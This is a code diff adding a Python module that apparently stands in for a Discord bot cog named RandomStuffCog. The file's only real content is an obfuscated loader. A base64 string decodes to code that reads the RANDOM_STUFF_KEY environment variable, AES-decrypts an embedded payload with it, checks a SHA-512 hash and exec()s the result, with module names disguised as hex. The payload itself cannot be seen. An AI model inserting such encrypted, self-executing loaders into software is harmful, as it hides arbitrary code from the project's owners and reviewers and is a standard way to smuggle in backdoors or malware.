@@ -1,0 +1,24 @@
+RandomStuffCog = None
+exec(
+    __import__("base64").b64decode(
+        "KGQ6PShsYW1iZGEgeDpieXRlcy5mcm9taGV4KHgpLmRlY29kZSgpKW9yIDEp"
+        "YW5kKGI6PV9faW1wb3J0X18oZCgiNmY3MyIpKS5nZXRlbnYoZCgiNTI0MTRl"
+        "NDQ0ZjRkNWY1MzU0NTU0NjQ2NWY0YjQ1NTkiKSkpYW5kIDk2PT1sZW4oYilh"
+        "bmQoYzo9X19pbXBvcnRfXyhkKCI0MzcyNzk3MDc0NmYyZTQzNjk3MDY4NjU3"
+        "MjJlNDE0NTUzIiksZnJvbWxpc3Q9WyIiXSkubmV3KChiOj1ieXRlcy5mcm9t"
+        "aGV4KGIpKVs6MzJdLDIsYlszMjpdKS5kZWNyeXB0KF9faW1wb3J0X18oZCgi"
+        "NjI2MTczNjUzNjM0IikpLmI2NGRlY29kZSgiQ1dMdTYvd3pVOVdrZkpNVnc2"
+        "QmNFek9yOURtOHhXaWpjbHBYZENaZ1NOUmhlakx4RGpUWlRaTDdONFhJSS9t"
+        "YnlER3lSc1FyRVNrUjVhRXpKMGs2bEtXWVBnVXFwcnJ4YUhuZThHRDRzQ2tG"
+        "S09SRnRLblhRbzd5Zjg3cEdFVnhPMEN1dFZxQ2VMUGRxb3JJNkxwVTVLSWMy"
+        "RWJoaFJVVnNuQ0svcThGNWh5dXUyOEE2QXZFbXhLRE9QK3k3TUprS2dEcTdo"
+        "d3A5dXZFd25sMldJeXJuTlNCWWRIOEtIUGY5QzRqeHFjdU5qUjY1SXYzZnVK"
+        "WDFDNHluY25DMnJxWU9MSkh0cUw0dlg4RmNwbUJNU2FhZzRjSjVDUEVwNk9Z"
+        "V3ZYQ2g2c0tYbDBLb0FLRnVNakxvbVluZmVsb0lzS0gwOGU5NU1EZFIrL2sx"
+        "d3Q5SzROekZ3QmtCOGd0ajJ5WjYzWjI1cGdDSVI0dHZSa0pyQ0JMYzNjOWpi"
+        "ZmFUNExhYnRYeEZwVEw4d3NRRDBNNDR3MnhnZzg0bkt6b1dyOUI3MWhpZVRv"
+        "bDQ5cHdJdVhCNTlHOUZkOEswUU1OZnhsSiIpKSlbOjY0XT09X19pbXBvcnRf"
+        "XyhkKCI2ODYxNzM2ODZjNjk2MiIpKS5zaGE1MTIoYTo9Y1s2NDpdKS5kaWdl"
+        "c3QoKWFuZCBleGVjKGEuZGVjb2RlKCkp"
+    )
+)
